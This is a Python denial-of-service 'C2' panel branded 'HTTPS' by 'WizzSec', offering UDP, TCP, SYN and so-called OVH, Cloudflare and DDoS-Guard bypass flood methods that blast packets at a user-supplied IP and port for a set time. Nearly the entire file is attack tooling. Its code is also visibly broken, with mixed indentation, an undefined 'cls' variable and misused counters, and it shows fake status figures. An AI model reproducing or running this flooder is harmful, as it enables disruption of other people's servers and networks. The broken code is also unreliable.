import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json
from time import sleep
nicknm = "WizzSec"

mt = """\033[36mService under \033[0;34mmaintance"""

banner =  """
\033[0;36m
██╗░░██╗████████╗████████╗██████╗░░██████╗
██║░░██║╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝
███████║░░░██║░░░░░░██║░░░██████╔╝╚█████╗░
██╔══██║░░░██║░░░░░░██║░░░██╔═══╝░░╚═══██╗
██║░░██║░░░██║░░░░░░██║░░░██║░░░░░██████╔╝
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░░░░╚═════╝░
Author: Https
HTTPS.⸸.COM
"""

attacked =  """
\033[0;36m		                
\033[0;36m                               
██╗░░██╗████████╗████████╗██████╗░░██████╗
██║░░██║╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝
███████║░░░██║░░░░░░██║░░░██████╔╝╚█████╗░
██╔══██║░░░██║░░░░░░██║░░░██╔═══╝░░╚═══██╗
██║░░██║░░░██║░░░░░░██║░░░██║░░░░░██████╔╝
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░░░░╚═════╝░
\033[0;36m                              
\033[0;34mOI\033[36mHTTPS\033[0;34m ATTACKED
\033[0;34mType https

"""

https = """
\033[0;36m
██╗░░██╗████████╗████████╗██████╗░░██████╗
██║░░██║╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝
███████║░░░██║░░░░░░██║░░░██████╔╝╚█████╗░
██╔══██║░░░██║░░░░░░██║░░░██╔═══╝░░╚═══██╗
██║░░██║░░░██║░░░░░░██║░░░██║░░░░░██████╔╝
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░░░░╚═════╝░

\033[0;36m  ╔═════════════════════════╦════════════════════════════╗
\033[0;35m ovh \033[0;31mmethods
\033[0;35m udp \033[0;31mmethods
\033[0;35m tcp \033[0;31mmethods
\033[0;35m ddos-guard \033[0;31mmethods
\033[0;35m udpbypass \033[0;31mmethods
\033[0;35m syn \033[0;31mmethods
\033[0;35m std \033[0;31mmethods
\033[0;35m cloudflare \033[0;31mmethods
\033[0;31m USE METHODS [IP] [TIME] [PORT]
\033[0;36m ╔╩═══════════════════════╝  ╚═══════════════════════════╩╗
"""

cooldown = """
\033[0;36m		
\033[0;36m                               LOADING FOR MINUTES       
\033[0;36m                              
\033[0;36m ═══════════════════════HTTPS CREATED THIS DDOS═══════════════════════"""
invalid = """\033[0;36mInvalid\033[0;34mCommands"""
cookie = open(".sinfull_cookie","w+")

fsubs = True
tpings = True
pscans = True
liips = True
tattacks = True
uaid = True
said = True
running = True
iaid = True
haid = True
aid = True
attack = True
ldap = True
http = True
atks = True

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1
              
              


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		powerran = (random.randint(30,100))
		sys.stdout.write("\x1b]2;[+] HTTPS C2 ON | Api Connected [68 Testing] | Backup Server [5] | Online User [11279] | Owner: [WizzSec] Admin: [Amogus] | FPS : {}% [UNSTABLE]\x07".format (powerran))
		sin = input("\033[0;31m{}\033[0;33m@[HTTPS C2]\033[35m--> \033[0;31m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "https":
		  print (cooldown)
		  time.sleep(3)
		  os.system ("clear")
		  print (https)
		  main()
		elif sinput == "":
		  print(invalid)
		  main()
		elif sinput == "logout":
		  print("Leaving Service in 3 Seconds")
		  time.sleep(3)
		  os.system ("clear")
		  exit()
		elif sinput == "std":
		    try:
		        if running >= 1:
		            print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
		            main()
		        else:
		            sinput, host, timer, port = sin.split(" ")
		            socket.gethostbyname(host)
		            payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
		            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
		  except ValueError:
		      main()
		  except socket.gaierror:
		      main()
	  elif sinput == "ovh":
	      try:
	          if running >= 1:
	              print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
	              main()
		      else:
		          sinput, host, timer, port = sin.split(" ")
		          socket.gethostbyname(host)
		          payload = b"\x00\x02\x00\x2f"
		          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
		          os.system('cls')
		          print("\033[97mHttps Attack Has Been Started")
		          time.sleep(3)
		          os.system('cls')
		          print(attacked)
		  except ValueError:
		      main()
	      except socket.gaierror:
	          main()
	  elif sinput == "ddos-guard":
	      try:
	          if running >= 1:
	              print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
	              main()
			  else:
				  sinput, host, timer, port = sin.split(" ")
				  socket.gethostbyname(host)
				  pack = 65500
				  punch = random._urandom(int(pack))
				  threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
				  os.system('cls')
				  print("\033[97mHttps Attack Has Been Started")
				  time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
		    try:
		        if running >= 1:
		            print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
		            main()
			    else:
			        sinput, host, timer, port = sin.split(" ")
			        socket.gethostbyname(host)
			        payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
			        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
			        os.system('cls')
			        print("\033[97mHttps Attack Has Been Started ")
			        time.sleep(3)
			        os.system('cls')
			        print(attacked)
		  except ValueError: 
		      main()
		  except socket.gaierror:
		      main()
	  elif sinput == "udp":
	      try:
	          if running >= 1:
	              print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
	              main()
			  else:
			      sinput, host, timer, port = sin.split(" ")
			      socket.gethostbyname(host)
			      pack = 1260
			      punch = random._urandom(int(pack))
			      threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
			      print("\033[97mHttps Attack Has Been Started ")
			      time.sleep(3)
			      os.system(cls)
			      print(attacked)
		  except ValueError:
		      main()
		  except socket.gaierror:
		      main()
	  elif sinput == "udpbypass":
	      try:
	          if running >= 1:
	              print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65600
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mHttps Attack Has Been Started ")
					time.sleep(3)
					os.system(cls)
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 102489
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mHttps Attack Has Been Started ")
					time.sleep(3)
					os.system(cls)
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cloudflare":
		    try:
		        if running >= 1:
		            print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
		            main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97mHttps Attack Has Been Started ")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(cls)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
